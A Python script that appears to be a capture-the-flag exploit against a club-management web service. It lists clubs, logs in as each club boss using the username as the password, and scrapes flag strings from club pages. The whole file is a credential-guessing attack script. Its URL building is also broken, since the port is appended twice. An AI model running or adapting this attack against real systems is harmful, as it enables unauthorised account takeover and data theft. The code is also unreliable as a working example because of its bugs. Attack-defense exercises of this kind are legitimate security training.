#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'wolf']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '9990'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ''
	bosses, clubs = all_clubs()

	for i in range(50):

		u_name = bosses[i]
		c_id = clubs[i]

		sess = login( u_name, u_name )

		for flag in view_club( sess, c_id ):
			flags += flag + "\n"

	print( flags, flush=True )


def login( u_name, passwd ):
	#http://10.80.32.2:9990/vhod | POST | {"имя":"hehehe","пароль":"hehehehehehe"}
	s = requests.session()
	s.post(f'http://{host}:{port}/vhod', json={"имя":u_name,"пароль":passwd})
	return s


def join( s, c_id ):
	#http://10.80.0.2:9990/vstupit | POST | {"клуб":"000000275","пароль":""}
	s.post(f'http://{host}:{port}/vstupit', json={"клуб":c_id,"пароль":""})


def all_clubs():
	#http://10.80.0.2:9990/klybi | GET
	#{"босс":"VdJKZZZN","ид":"000002108","название":"TAFFtFK7"}
	data = requests.get(f'http://{host}:{port}/klybi').text
	return re.findall( '"босс":"(\w+)"', data), re.findall( '"ид":"(\d+)"', data)


def view_club( s, c_id ) -> list:
	#http://10.80.0.2:9990/chezaklub?%D0%BA%D0%BB%D0%B8%D0%B4=000000264
	data = s.get(f'http://{host}:{port}/chezaklub?%D0%BA%D0%BB%D0%B8%D0%B4={c_id}', json={"клид":c_id}).text
	return FlagRegExp.findall( data )


if __name__ == '__main__':
	main()